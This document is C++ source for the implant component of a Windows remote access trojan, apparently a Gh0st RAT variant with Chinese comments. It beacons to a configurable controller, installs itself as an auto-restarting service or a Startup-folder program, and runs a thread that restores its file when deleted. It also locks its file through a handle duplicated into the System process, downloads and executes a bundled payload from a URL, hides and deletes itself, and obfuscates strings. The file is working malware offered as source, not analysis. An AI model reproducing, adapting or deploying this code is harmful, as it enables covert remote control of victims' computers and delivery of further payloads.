// Server.cpp : Defines the entry point for the application.
//

// MainDll.cpp : Defines the entry point for the DLL application.
//

#include "stdafx.h"
#include "common/KernelManager.h"
#include "common/Login.h"

#include  <io.h>
#include <shlobj.h>
#include <STDIO.H>

#pragma comment(lib,"wininet.lib")
#pragma comment(lib, "vfw32.lib")

#include <UrlMon.h>
#import "msxml3.dll"
#pragma comment(lib, "urlmon.lib")

#include <Shlwapi.h>
#pragma comment(lib,"shlwapi.lib")


HMODULE hDllModule = NULL; 
BOOL    bisUnInstall = FALSE;
 

ONLINE_DATA online_data = 
{
	"127.0.0.1",
		8090,
		"",//撩你如何
		"",
		0,
		"",
		"",
		"",
		"",
		"",
		'"',
		'"',
		'"',
		0,
		0,
		0,
		0,
		
};

char NtrLoginAddr[100];    //上线地址
DWORD NtrLoginPort;		//上线端口
char NtrUpGroup[32];       //上线分组
char NtrVersion[32];		//上线版本
CHAR NtrServiceName[100];   //服务名称
CHAR NtrServicePlay[128];   //服务显示
CHAR NtrServiceDesc[256];   //服务描述
CHAR NtrFolderName[256];	 //目录名称
CHAR NtrProcessName[128];   //进程名称
CHAR NtrInstall;            //启动类型
CHAR NtrMutex[100];		//运行互斥
CHAR NtrBuildtime[100];	//配置时间
CHAR NtrszDownRun[300];     //捆绑地址
BOOL NtrAntideletion;       //防删除
BOOL NtrSelfdeletion;		//自删除


int main(LPVOID p);
LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{
	// 发生异常，重新创建进程
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 0;
}

//运行互斥 建立对象名称
BOOL my_CreateEvent(BOOL str)
{
	BOOL strts=NULL;
	
	HANDLE hMutex = CreateEvent(NULL, FALSE, FALSE,NtrMutex);  //运行互斥 对象名称
	if(hMutex != NULL)  //建立成功
	{
		
		if (GetLastError()==ERROR_ALREADY_EXISTS)
		{
			
			Sleep(1000);
			strts = TRUE;
		}
		
		if(str)
		{
			
			CloseHandle(hMutex);  //释放 互诉
		}
	}
	else
		strts = TRUE;
	
	return strts;
}


int main(LPVOID p)
{
	if(my_CreateEvent(NULL))  //运行互斥
	   {
		return 0;  // 退出运行程序
	   }
	if (CKernelManager::g_hInstances!=NULL)
	   {
		SetUnhandledExceptionFilter(bad_exception);
	   }
	

    CClientSocket SocketClient;
	int     nSleep = 0;
	bool	bBreakError = false;
	while (1)
	{
		if (bBreakError != false)
		{
			nSleep = rand();
			Sleep(nSleep % 120000);
		}
		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}
		char	lpszHost[256]={0};
        UINT  	dwPort = 0;
		dwPort = NtrLoginPort;
		lstrcat(lpszHost,NtrLoginAddr);
		
		if(strcmp(lpszHost,"") == 0)
		{
			bBreakError = true;
			continue;
		}
		
		DWORD dwTickCount = GetTickCount();
		if (!SocketClient.Connect(lpszHost, dwPort))
		{
			bBreakError = true;
			continue;
		}
		
		CKernelManager	manager(&SocketClient,lpszHost,dwPort,TRUE);

		SocketClient.SetManagerCallBack(&manager);
		
		if(SendLoginInfo(&SocketClient,GetTickCount() - dwTickCount) <= 0)
		{
			SocketClient.Disconnect();
			bBreakError = true;
			continue;
		}
		DWORD	dwIOCPEvent;
		do
		{
			dwIOCPEvent = WaitForSingleObject(SocketClient.m_hEvent,100);
			Sleep(500);
		} while( dwIOCPEvent != WAIT_OBJECT_0 && !bisUnInstall);
		
		if(bisUnInstall)
		{
			SocketClient.Disconnect();
			break;
		}
	}
	return 0;
}



DWORD __stdcall MainThread()
{	
	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	return 1;
}





//复活线程
DWORD WINAPI ShieldThread()
{
	char   FilePath[MAX_PATH];  
	HANDLE hFile;  
	HANDLE hSearch;  
	void*  Mem;  
	int    Size;  
	DWORD  BytesRead;  
	WIN32_FIND_DATA  FileData;  
	char   ProtectKey1[MAX_PATH*2],ProtectKey2[MAX_PATH*2];  
	__try 
	{ 
		GetModuleFileName(NULL,FilePath,MAX_PATH);  //获取自身路径
		//		MessageBox(NULL,FilePath,"",0);
		hFile =CreateFile(FilePath,GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);  //打开自身
		Size  =GetFileSize(hFile,0);  //获取自身大小
		Mem   =VirtualAlloc(0,Size,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);  //申请自身内存,大小为自身大小
		ReadFile(hFile,Mem,Size,&BytesRead,0); //获取自身的CODE
		CloseHandle(hFile); //关闭句柄
		while(1)  
		{  
			hSearch =FindFirstFile(FilePath,&FileData);  
			if(hSearch==INVALID_HANDLE_VALUE)  //如果自身不存在,说明自身被删被杀了
			{  
				hFile=CreateFile(FilePath,GENERIC_WRITE,0,0,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,0);  //创建文件句柄
				WriteFile(hFile,Mem,Size,&BytesRead,0);  //写入刚才获取到的自身的Code
				CloseHandle(hFile);  //关闭句柄
				
				//完成复活
			}  
			FindClose(hSearch);  
			Sleep(15000);  //检测周期15秒
		}  
	}  
	__finally  
	{  
		
		CloseHandle(hFile);  
		FindClose(hSearch);  
	}  
	return TRUE; 
} 


////////////////////////////服务启动
//创建文件夹
void MyCreatDirector(LPSTR Path) 
{
	CHAR Dir[MAX_PATH]={NULL};
	int i;
	for (i=0;(size_t)i<strlen(Path);i++)
	{
		if(Path[i]=='\\')
		{
			
			strncpy(Dir,Path,i);
			
			if(_access(Dir,NULL)==-1)
			{
				
				CreateDirectory(Dir,NULL);
				
			}
		}
	}
	
}


#include <SHELLAPI.H>
int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress );
void __stdcall ServiceHandler(DWORD dwControl);
SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
    SERVICE_STATUS srvStatus;
    srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
    srvStatus.dwCurrentState = g_dwCurrState = dwState;
    srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    srvStatus.dwWin32ExitCode = dwExitCode;
    srvStatus.dwServiceSpecificExitCode = 0;
    srvStatus.dwCheckPoint = dwProgress;
    srvStatus.dwWaitHint = 1000;
    return SetServiceStatus( hServiceStatus, &srvStatus );
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
    switch( dwControl )
    {
    case SERVICE_CONTROL_STOP:
        TellSCM( SERVICE_STOP_PENDING, 0, 1 );
        Sleep(10);
        TellSCM( SERVICE_STOPPED, 0, 0 );
        break;
    case SERVICE_CONTROL_PAUSE:
        TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
        TellSCM( SERVICE_PAUSED, 0, 0 );
        break;
    case SERVICE_CONTROL_CONTINUE:
        TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
        TellSCM( SERVICE_RUNNING, 0, 0 );
        break;
    case SERVICE_CONTROL_INTERROGATE:
        TellSCM( g_dwCurrState, 0, 0 );
        break;
    }
	
}

HANDLE RunInActiveSession(LPCTSTR lpCommandLine)
{
	HANDLE hProcess;
	HANDLE result;
	HANDLE hProcessInfo;
	
	HINSTANCE userenv = LoadLibrary("userenv.dll"); 
	typedef DWORD (WINAPI *CEB)(LPVOID *lpEnvironment,HANDLE hToken,BOOL bInherit);
	CEB  myCreateEnvironmentBlock= (CEB  )GetProcAddress(userenv,"CreateEnvironmentBlock");
	
	
	LPVOID lpEnvironment = NULL;
	DWORD TokenInformation = 0;
	HANDLE hExistingToken = NULL;
	HANDLE hObject = NULL;
	
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;
	ZeroMemory(&StartupInfo,sizeof(STARTUPINFO));
	ZeroMemory(&ProcessInfo,sizeof(PROCESS_INFORMATION));
	
	ProcessInfo.hProcess = 0;
	ProcessInfo.hThread = 0;
	ProcessInfo.dwProcessId = 0;
	ProcessInfo.dwThreadId = 0;
	StartupInfo.cb = 68;
	StartupInfo.lpDesktop = "WinSta0\\Default";
	
	hProcess = GetCurrentProcess();
	OpenProcessToken(hProcess, 0xF01FFu, &hExistingToken);
	DuplicateTokenEx(hExistingToken,  0x2000000u, NULL, SecurityIdentification, TokenPrimary, &hObject);
	typedef DWORD (WINAPI *TWTSGetActiveConsoleSessionId)(void);
	
	TWTSGetActiveConsoleSessionId  MyWTSGetActiveConsoleSessionId;
	MyWTSGetActiveConsoleSessionId = (TWTSGetActiveConsoleSessionId  )GetProcAddress(LoadLibrary("Kernel32.dll"),"WTSGetActiveConsoleSessionId");
	
	if ( MyWTSGetActiveConsoleSessionId )
	{
		TokenInformation = MyWTSGetActiveConsoleSessionId();
		
		SetTokenInformation(hObject, TokenSessionId, &TokenInformation, sizeof(DWORD));
		myCreateEnvironmentBlock(&lpEnvironment, hObject, false);
		//WTSQueryUserToken(TokenInformation,&hObject);
		CreateProcessAsUser(
			hObject,
			NULL,
			(TCHAR*)lpCommandLine,
			NULL,
			NULL,
			false,
			0x430u,
			lpEnvironment,
			NULL,
			&StartupInfo,
			&ProcessInfo);
		hProcessInfo = ProcessInfo.hProcess;
		CloseHandle(hObject);
		CloseHandle(hExistingToken);
		result = hProcessInfo;
	}
	else
	{
		result = 0;
	}
	
	if(userenv)
		FreeLibrary(userenv);
	
	return result;
}

void ServiceMain(DWORD dwargc,wchar_t* argv[])
{
    hServiceStatus = RegisterServiceCtrlHandler(NtrServiceName, (LPHANDLER_FUNCTION)ServiceHandler);
    if( hServiceStatus == NULL )
    {
        return;
    }
    TellSCM( SERVICE_START_PENDING, 0, 1 );
    TellSCM( SERVICE_RUNNING, 0, 0);
	OSVERSIONINFO OSversion;	
	OSversion.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
	GetVersionEx(&OSversion);

	if (NtrAntideletion)
			CreateThread(0,0,(LPTHREAD_START_ROUTINE)ShieldThread,0,0,0);//复活线程

	if (OSversion.dwPlatformId == VER_PLATFORM_WIN32_NT)
    {
        if (OSversion.dwMajorVersion < 6)
		{
			HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MainThread(), (LPVOID)NtrServiceName, 0, NULL);
			do
			{
				Sleep(100);
				
			}while(g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
		}
		else
		{
			TCHAR MyName[MAX_PATH];
			HANDLE hActiveSession;
			DWORD ExitCode = 0; 
			GetModuleFileName(NULL,MyName,sizeof(MyName));//获取当前文件路径
			char CommandLine[1024];
			wsprintfA(CommandLine,"%s Win7",MyName);
			
			hActiveSession = RunInActiveSession(CommandLine);
			CloseHandle(hActiveSession);
			
			
		}
    }
	do
	{
		Sleep(100);
	}while (g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED && bisUnInstall == FALSE);
	//这里不加会一直运行程序
}

//安装服务
BOOL NtInstallService(LPCTSTR strServiceName, //服务名称
					  LPCTSTR strDisplayName, //服务显示名称
					  LPCTSTR strDescription, //服务描述
					  LPCTSTR strPathName,    //可执行文件的路径
					  LPCTSTR Dependencies,   //指定启动该服务前必须先启动的服务或服务组,一般为NULL
					  BOOLEAN KernelDriver,   //是否安装驱动程序
					  ULONG   StartType       //启动类型
					  )
{
    BOOL bRet = FALSE;
    SC_HANDLE svc=NULL, scm=NULL;
    __try
    {
        scm = OpenSCManager(0, 0,SC_MANAGER_ALL_ACCESS);
        if (!scm)
		{
            return -1;
        }
		svc = CreateService(
            scm, 
            strServiceName, 
            strDisplayName,
            SERVICE_ALL_ACCESS|SERVICE_CHANGE_CONFIG,
            KernelDriver ? SERVICE_KERNEL_DRIVER : SERVICE_WIN32_OWN_PROCESS| SERVICE_INTERACTIVE_PROCESS,
            StartType,
            SERVICE_ERROR_IGNORE,
            strPathName,
            NULL, NULL, Dependencies, NULL, NULL);
		
		
		
		SERVICE_FAILURE_ACTIONS sdBuf={0};
		ChangeServiceConfig2(svc, SERVICE_CONFIG_DESCRIPTION, &sdBuf);
		sdBuf.lpRebootMsg=NULL;
		sdBuf.dwResetPeriod=NULL;
		
		SC_ACTION action[3];
		action[0].Delay=5000;
		action[0].Type=SC_ACTION_RESTART;
		action[1].Delay=0;
		action[1].Type=SC_ACTION_RESTART;
		action[2].Delay=0;
		action[2].Type=SC_ACTION_RESTART;
		sdBuf.cActions=3;
		sdBuf.lpsaActions=action;
		sdBuf.lpCommand=NULL;
		ChangeServiceConfig2(svc, SERVICE_CONFIG_FAILURE_ACTIONS, &sdBuf);
		
		// 		SERVICE_DESCRIPTION Service_Descrip={&strDisplayName};
		ChangeServiceConfig2(svc,SERVICE_CONFIG_DESCRIPTION,&sdBuf);
		
		if (svc == NULL)
        {
            if (GetLastError() == ERROR_SERVICE_EXISTS)
            {
                svc = OpenService(scm,strServiceName,SERVICE_ALL_ACCESS);
                if (svc==NULL)
                    __leave;
                else
                    StartService(svc,0, 0);
            }
        }
		if (!StartService(svc,0, 0))
            __leave;
		
		char str[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','%','s','\0'};
        TCHAR Desc[MAX_PATH];
        wsprintfA(Desc,str, strServiceName);
		
		WriteRegEx(HKEY_LOCAL_MACHINE, 
			Desc, 
			"Description", 
			REG_SZ, 
			(char*)strDescription, 
			lstrlen(strDescription), 
			0);			
		
        bRet = TRUE;
    }
    __finally
    {
        if (svc!=NULL)
            CloseServiceHandle(svc);
        if (scm!=NULL)
            CloseServiceHandle(scm);
    }
	
    return bRet;
}

/****************************************占坑防删除*************************************************/
void RaiseToDebugP()  //提权函数  
{  
    HANDLE hToken;  	
    HANDLE hProcess = GetCurrentProcess();  	
    if (OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken) )  
	{  	
        TOKEN_PRIVILEGES tkp;  
		
		char QNdJE01[] = {'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e','\0'};
		if (LookupPrivilegeValue(NULL, QNdJE01, &tkp.Privileges[0].Luid) )
		{  
            tkp.PrivilegeCount = 1;  
			
            tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  
			
			BOOL bREt = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, 0) ;  
			
		}  
        CloseHandle(hToken);  	
	}      
	
}  

BOOL OccupyFile( LPCTSTR lpFileName )  
{
	BOOL    bRet;  
	//提升自身权限  
	
	RaiseToDebugP();  
	//打开一个pid为4的进程，只要是存在的进程，都可以 
	
	HANDLE hProcess = OpenProcess( PROCESS_DUP_HANDLE, FALSE, 4);    // 4为system进程号  
	
	if ( hProcess == NULL )  
	{            
		return FALSE;  
	}  
	
	HANDLE hFile;  
	HANDLE hTargetHandle;  
	//以独占模式打开目标文件  
	hFile = CreateFile( lpFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL, NULL);   
	if ( hFile == INVALID_HANDLE_VALUE )  
	{  
		CloseHandle( hProcess );  
		return FALSE;  
	}  
	
	//把文件句柄复制到pid=4的进程中去，这样，只要pid=4的进程不退出，谁也动不了目标文件  
	
	bRet = DuplicateHandle( GetCurrentProcess(), hFile, hProcess, &hTargetHandle,   
		0, FALSE, DUPLICATE_SAME_ACCESS|DUPLICATE_CLOSE_SOURCE);  
	
	CloseHandle( hProcess );  
	
	
	return bRet;  
}  

///////////////////////////////////////////////////////
bool FileDownRun(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	const char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	
	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	
}


DWORD WINAPI DownRun(LPVOID lparam)
{
	int	nUrlLength;
	char	*lpURL = NULL;
	char	*lpFileName = NULL;
	nUrlLength = strlen((char *)lparam);
	if (nUrlLength == 0)
		return false;
	
	lpURL = (char *)malloc(nUrlLength + 1);
	
	memcpy(lpURL, lparam, nUrlLength + 1);
	
	lpFileName = strrchr(lpURL, '/') + 1;
	if (lpFileName == NULL)
		return false;
	char szFile[512] = {0};
	wsprintf(szFile,"c:\\%s",lpFileName );
	
	HRESULT hr = URLDownloadToFile(NULL,lpURL, szFile, 0, NULL);
	if ( hr == S_OK ) {
		if ( !CheckFileExist(szFile) )
			return false; //文件下载成功，但是文件不存在，很可能被杀毒软件查杀
    }else if ( hr == INET_E_DOWNLOAD_FAILURE ) 
		return false;    //URL 不正确，文件下载失败	
	else
		return false; //文件下载失败，请检查URL是否正确
	
	FileDownRun(szFile,SW_SHOW);
	
	return true;
}

// 写注册表 分组 备注 安装时间 信息
void SetRegInfo()
{
	char strSubKey[MAX_PATH];
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", NtrServiceName);
	//分组
	WriteRegEx(HKEY_LOCAL_MACHINE,strSubKey,"Group", REG_SZ,NtrUpGroup, strlen(NtrUpGroup),0);

}

//卸载程序
extern HMODULE hDllModule;
void MysDeleteSel()
{
	char	strServiceDll[MAX_PATH];
	char	strRandomFile[MAX_PATH];
	
	GetModuleFileName(hDllModule,strServiceDll,sizeof(strServiceDll));
	GetSystemDirectory(strRandomFile, sizeof(strRandomFile));
	wsprintfA(strRandomFile, "%s\\%d.bak",strRandomFile, GetTickCount());
	MoveFile(strServiceDll, strRandomFile);
	MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
}


extern "C" __declspec(dllexport) LPVOID Shellex(ONLINE_DATA m_Install)
{	

	int nInStallSizeof=sizeof(ONLINE_DATA)+1;
	ONLINE_DATA *pNewInStall=(ONLINE_DATA *)new  char[nInStallSizeof];
	memcpy(pNewInStall,&m_Install,nInStallSizeof);
	lstrcpy(NtrLoginAddr,pNewInStall->LoginAddr);
	NtrLoginPort=pNewInStall->LoginPort;
	lstrcpy(NtrUpGroup,pNewInStall->UpGroup);
	lstrcpy(NtrVersion,pNewInStall->Version);	
	lstrcpy(NtrServiceName,pNewInStall->ServiceName);
	lstrcpy(NtrServicePlay,pNewInStall->ServicePlay);
	lstrcpy(NtrServiceDesc,pNewInStall->ServiceDesc);	

	lstrcpy(NtrFolderName,pNewInStall->FolderName);
	lstrcpy(NtrProcessName,pNewInStall->ProcessName);
	NtrInstall=pNewInStall->Install;
	lstrcpy(NtrMutex,pNewInStall->Mutex);
	lstrcpy(NtrBuildtime,pNewInStall->Buildtime);
	lstrcpy(NtrszDownRun,pNewInStall->szDownRun);	
	NtrAntideletion=pNewInStall->Antideletion;
	NtrSelfdeletion=pNewInStall->Selfdeletion;

	delete[] pNewInStall;
	
	OutputDebugString("进入加载Shellex");
	
	WNDCLASS m_WndClass;
	ZeroMemory(&m_WndClass,sizeof(WNDCLASS));
	
	//水平拖动
	m_WndClass.style=CS_HREDRAW;
	
	//回调函数地址
	m_WndClass.lpfnWndProc=NULL;
	
	//附加数据  总是为NULL
	m_WndClass.cbClsExtra = NULL;
	
	//附加数据  总是为NULL
	m_WndClass.cbWndExtra = NULL;
	
	//程序实例
	m_WndClass.hInstance  = NULL;
	
	//程序Icon
	m_WndClass.hIcon = LoadIcon(NULL,IDI_INFORMATION);
	
	//程序光标
	m_WndClass.hCursor = LoadCursor(NULL,IDC_HELP);
	
	//背景颜色
	m_WndClass.hbrBackground = (HBRUSH)GetStockObject(GRAY_BRUSH);
	
	//程序类名
	m_WndClass.lpszClassName = NULL;
	
	//注册类名
	RegisterClass(&m_WndClass);
	
	// TODO: Place code here.
	//////////////////////////////////////////////////////////////////////////
	// 让启动程序时的小漏斗马上消失
	GetInputState();
	PostThreadMessage(GetCurrentThreadId(),NULL,0,0);
	MSG	msg;
	GetMessage(&msg, NULL, NULL, NULL);

	//创建互斥
	char	strInstallModule[MAX_PATH]; 
	memset(strInstallModule, 0, sizeof(strInstallModule)); 
	
	GetModuleFileName(GetModuleHandle(0),strInstallModule,sizeof(strInstallModule));
	

	HANDLE m_hMutex;
	m_hMutex = CreateMutex(NULL, FALSE, strInstallModule);
	if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS)
	{
		exit(0);
		ExitProcess(0);
		return 0;
	}



	if (NtrszDownRun != NULL)
	{
		MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DownRun,
			(LPVOID)NtrszDownRun, 0, NULL, true);
	}

	SetRegInfo();

	if(NtrInstall)//如果不是绿色安装
	{
		if (NtrInstall == 2)
		{
			Installope= 1;//服务启动
			SERVICE_TABLE_ENTRY serviceTable[] = { {NtrServiceName,(LPSERVICE_MAIN_FUNCTION) ServiceMain}, {NULL,NULL} };//如果已经存在直接启动服务
			
			if (!StartServiceCtrlDispatcher(serviceTable))
			{	
				char MgzBp[MAX_PATH];
				char szPath[MAX_PATH];//保存自身文件名的字符串
				LPSTR pszReleaseFilePath=new char[MAX_PATH];
				SHGetSpecialFolderPath(NULL,pszReleaseFilePath,CSIDL_PROGRAM_FILES,FALSE);
				lstrcat(pszReleaseFilePath,"\\");
				lstrcat(pszReleaseFilePath,NtrFolderName);

				strcpy(NtrFolderName,pszReleaseFilePath);

				if(NtrFolderName[strlen(NtrFolderName)-1]=='\\') //去掉最后的'\\'
					NtrFolderName[strlen(NtrFolderName)-1]=0;

				char DQeBW01[] = {'%','s','\\','%','s','\0'};
				sprintf(MgzBp,DQeBW01,NtrFolderName,NtrProcessName);   //连接安装目录和程序名称
				char * toPath = MgzBp;        //要复制到的路径字符串

				MyCreatDirector(MgzBp);	//文件夹不存在创建文件夹
				GetModuleFileNameA(NULL,(LPCH)szPath,225);     //获取自身路径的函数	
				CopyFileA(szPath,toPath,false);       //复制函数，从szPath复制到toPath，强行覆盖原有文件
	
				BOOL szBool = NtInstallService(NtrServiceName,NtrServicePlay,NtrServiceDesc,toPath,NULL,false,SERVICE_AUTO_START);//安装服务

				if (NtrAntideletion)
				{
					OccupyFile(toPath); //占坑安装
				}	
				if (!szBool)//安装失败直接上线
				{
					MainThread();		
				}
				else if (NtrSelfdeletion)
				{
					SetFileAttributes(toPath, FILE_ATTRIBUTE_HIDDEN);  // 设置文件属性
					SetRegInfo(); //写注册表信息
					MysDeleteSel();
		}
			}
		}
		if (NtrInstall == 1)
		{
			Installope= 2;//写入启动
			TCHAR   szPath[MAX_PATH];
			TCHAR	MyPath[MAX_PATH];
			if (!SHGetSpecialFolderPath(NULL, szPath, CSIDL_STARTUP, FALSE))
			{
				return FALSE;
			}

			GetModuleFileName(NULL,MyPath,MAX_PATH);//获取当前目录
			PathRemoveFileSpec(MyPath);//去除文件名
			if (strcmp(MyPath,szPath) == 0)  //如果当前目录就是启动目录直接上线
			{
				if (NtrAntideletion)
				{
					CreateThread(0,0,(LPTHREAD_START_ROUTINE)ShieldThread,0,0,0);//复活线程
				}
				MainThread(); //上线
				return 0;
			}

			char FileName[80];
			wsprintf(FileName,"%s.exe",NtrProcessName);
			TCHAR buf[MAX_PATH], buf2[MAX_PATH];
			wsprintf(buf, "%s\\%s", szPath, FileName);
			if (GetFileAttributes(buf) == -1)
			{
				wsprintf(buf2, "\\??\\%s\\%s", szPath, FileName);
				DefineDosDevice(1, "agmkis2", buf2);
				Sleep(100);
				char strInstallModule[MAX_PATH];
				GetModuleFileNameA(NULL,(LPCH)strInstallModule,225);     //获取自身路径的函数
				CopyFile(strInstallModule,"\\\\.\\agmkis2",FALSE);//拷贝自身文件
				MoveFileEx(strInstallModule, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
				CreateDirectory(szPath, NULL); //创建目录
				if (NtrSelfdeletion) //是不是自删除
				{
					ShellExecute(NULL,"open",buf,NULL,NULL,SW_HIDE);
					MysDeleteSel();
					return 0;
				}else if (NtrAntideletion)
				{
					CreateThread(0,0,(LPTHREAD_START_ROUTINE)ShieldThread,0,0,0);//复活线程
					OccupyFile(buf);
			}
			}
			MainThread(); //如果安装失败直接上线
			return 0;
		}	
	}
	else
	{	
		Installope= 0;//绿色启动
		HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);
		WaitForSingleObject(hThread, INFINITE);
		CloseHandle(hThread);
		if (NtrAntideletion)	
			CreateThread(0,0,(LPTHREAD_START_ROUTINE)ShieldThread,0,0,0);//复活线程
		return 0;	
	}
	return 0;
}



